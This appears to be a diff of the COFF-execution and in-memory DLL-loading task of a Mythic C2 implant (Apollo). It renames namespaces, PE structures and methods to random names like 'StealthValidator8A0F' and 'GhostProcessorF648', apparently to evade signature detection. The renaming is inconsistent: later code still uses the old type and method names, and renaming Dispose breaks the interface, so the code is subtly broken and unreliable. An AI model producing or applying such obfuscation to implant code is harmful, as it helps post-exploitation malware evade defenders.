@@ -6,11 +6,11 @@
 
 #if EXECUTE_COFF
 
-using ApolloInterop.Classes;
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
-using ApolloInterop.Utils;
+using PhantomInterop.Classes;
+using PhantomInterop.Classes.Api;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
+using PhantomInterop.Utils;
 using System;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
@@ -23,10 +23,10 @@ using static Tasks.execute_coff;
 
 namespace Tasks
 {
-    public class execute_coff : Tasking
+    public class TacticalProvider09AD : Tasking
     {
         [DataContract]
-        internal struct CoffParameters
+        internal struct ShadowValidatorD971
         {
             [DataMember(Name = "coff_name")]
             public string CoffName;
@@ -67,7 +67,7 @@ namespace Tasks
 
         }
         // claude version
-        public class MemoryModule : IDisposable
+        public class IntelligentResolverA628 : IDisposable
         {
             #region Native Methods
 
@@ -173,7 +173,7 @@ namespace Tasks
             #region Structures
 
             [StructLayout(LayoutKind.Sequential)]
-            private struct IMAGE_DOS_HEADER
+            private struct StealthValidator8A0F
             {
                 public ushort e_magic;
                 public ushort e_cblp;
@@ -199,7 +199,7 @@ namespace Tasks
             }
 
             [StructLayout(LayoutKind.Sequential)]
-            private struct IMAGE_FILE_HEADER
+            private struct StealthHandlerDA5E
             {
                 public ushort Machine;
                 public ushort NumberOfSections;
@@ -211,14 +211,14 @@ namespace Tasks
             }
 
             [StructLayout(LayoutKind.Sequential)]
-            private struct IMAGE_DATA_DIRECTORY
+            private struct EnhancedControllerCB88
             {
                 public uint VirtualAddress;
                 public uint Size;
             }
 
             [StructLayout(LayoutKind.Sequential)]
-            private struct IMAGE_OPTIONAL_HEADER32
+            private struct OptimizedExecutor053D
             {
                 public ushort Magic;
                 public byte MajorLinkerVersion;
@@ -255,7 +255,7 @@ namespace Tasks
             }
 
             [StructLayout(LayoutKind.Sequential)]
-            private struct IMAGE_OPTIONAL_HEADER64
+            private struct FlexibleResolverAB4C
             {
                 public ushort Magic;
                 public byte MajorLinkerVersion;
@@ -291,7 +291,7 @@ namespace Tasks
             }
 
             [StructLayout(LayoutKind.Sequential)]
-            private struct IMAGE_NT_HEADERS32
+            private struct AdvancedProvider89E4
             {
                 public uint Signature;
                 public IMAGE_FILE_HEADER FileHeader;
@@ -299,7 +299,7 @@ namespace Tasks
             }
 
             [StructLayout(LayoutKind.Sequential)]
-            private struct IMAGE_NT_HEADERS64
+            private struct ShadowAdapterADA8
             {
                 public uint Signature;
                 public IMAGE_FILE_HEADER FileHeader;
@@ -307,7 +307,7 @@ namespace Tasks
             }
 
             [StructLayout(LayoutKind.Sequential)]
-            private struct IMAGE_SECTION_HEADER
+            private struct AdaptiveMonitor808A
             {
                 [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
                 public byte[] Name;
@@ -323,7 +323,7 @@ namespace Tasks
             }
 
             [StructLayout(LayoutKind.Sequential)]
-            private struct IMAGE_IMPORT_DESCRIPTOR
+            private struct EnhancedService0AFC
             {
                 public uint OriginalFirstThunk;
                 public uint TimeDateStamp;
@@ -333,7 +333,7 @@ namespace Tasks
             }
 
             [StructLayout(LayoutKind.Sequential)]
-            private struct IMAGE_THUNK_DATA32
+            private struct StealthMonitor6DCE
             {
                 public uint ForwarderString;      // PBYTE
                 public uint Function;             // PDWORD
@@ -342,7 +342,7 @@ namespace Tasks
             }
 
             [StructLayout(LayoutKind.Sequential)]
-            private struct IMAGE_THUNK_DATA64
+            private struct StrategicResolver70C4
             {
                 public ulong ForwarderString;     // PBYTE
                 public ulong Function;            // PDWORD
@@ -351,7 +351,7 @@ namespace Tasks
             }
 
             [StructLayout(LayoutKind.Sequential)]
-            private struct IMAGE_IMPORT_BY_NAME
+            private struct StrategicTrackerA724
             {
                 public ushort Hint;
                 // Variable length array of bytes follows
@@ -359,14 +359,14 @@ namespace Tasks
             }
 
             [StructLayout(LayoutKind.Sequential)]
-            private struct IMAGE_BASE_RELOCATION
+            private struct IntelligentDispatcherFE17
             {
                 public uint VirtualAddress;
                 public uint SizeOfBlock;
             }
 
             [StructLayout(LayoutKind.Sequential)]
-            private struct IMAGE_EXPORT_DIRECTORY
+            private struct SpectreHandlerDECE
             {
                 public uint Characteristics;
                 public uint TimeDateStamp;
@@ -544,12 +544,12 @@ namespace Tasks
             /// </summary>
             /// <param name="functionName">The name of the function to get.</param>
             /// <returns>A pointer to the function.</returns>
-            public IntPtr GetProcAddressFromMemory(string functionName)
+            public IntPtr GhostProcessorF648(string functionName)
             {
                 if (_disposed)
                     throw new ObjectDisposedException(nameof(MemoryModule));
 
-                if (string.IsNullOrEmpty(functionName))
+                if (ValidationHelper.IsStringEmpty(functionName))
                     throw new ArgumentNullException(nameof(functionName));
 
                 if (_baseAddress == IntPtr.Zero)
@@ -649,7 +649,7 @@ namespace Tasks
 
             #region Private Methods
 
-            private void ProcessImports()
+            private void RobustHandler283E()
             {
                 // Get pointers to PE headers
                 IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(_baseAddress, typeof(IMAGE_DOS_HEADER));
@@ -753,7 +753,7 @@ namespace Tasks
                 }
             }
 
-            private void ProcessRelocations()
+            private void StrategicWorkerE364()
             {
                 // Check if relocations are necessary
                 long delta = _baseAddress.ToInt64() - (long)_imageBase;
@@ -849,7 +849,7 @@ namespace Tasks
                 }
             }
 
-            private void ProtectMemory()
+            private void AdvancedAdapterFF0D()
             {
                 // Get pointers to PE headers
                 IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(_baseAddress, typeof(IMAGE_DOS_HEADER));
@@ -920,7 +920,7 @@ namespace Tasks
             /// <summary>
             /// Disposes the memory module and frees all resources.
             /// </summary>
-            public void Dispose()
+            public void SpectreWorkerD99D()
             {
                 Dispose(true);
                 GC.SuppressFinalize(this);
@@ -972,7 +972,7 @@ namespace Tasks
 
             #endregion
         }
-        public static bool LoadDLL(byte[] dllBytes)
+        public static bool WraithTracker3ED6(byte[] dllBytes)
         {
             if(_RunCOFF == null || _Unhexlify == null || _BeaconGetOutputData == null)
             {
@@ -993,7 +993,7 @@ namespace Tasks
             return true;
         }
         // Class to hold the state for COFF execution thread
-        private class COFFExecutionState
+        private class NexusRouter28D9
         {
             public IAgent Agent { get; set; }
             public string FunctionName { get; set; }
@@ -1008,7 +1008,7 @@ namespace Tasks
         }
 
         // Method to run COFF in a separate thread
-        private static void ExecuteCOFFThreadFunc(object state)
+        private static void NexusController766E(object state)
         {
             COFFExecutionState executionState = (COFFExecutionState)state;
             IAgent agent = executionState.Agent;
@@ -1143,7 +1143,7 @@ namespace Tasks
             try
             {
                 CoffParameters parameters = _jsonSerializer.Deserialize<CoffParameters>(_data.Parameters);
-                if (string.IsNullOrEmpty(parameters.CoffName) ||  string.IsNullOrEmpty(parameters.FunctionName))
+                if (ValidationHelper.IsStringEmpty(parameters.CoffName) ||  ValidationHelper.IsStringEmpty(parameters.FunctionName))
                 {
                     resp = CreateTaskResponse(
                         $"One or more required arguments was not provided.",
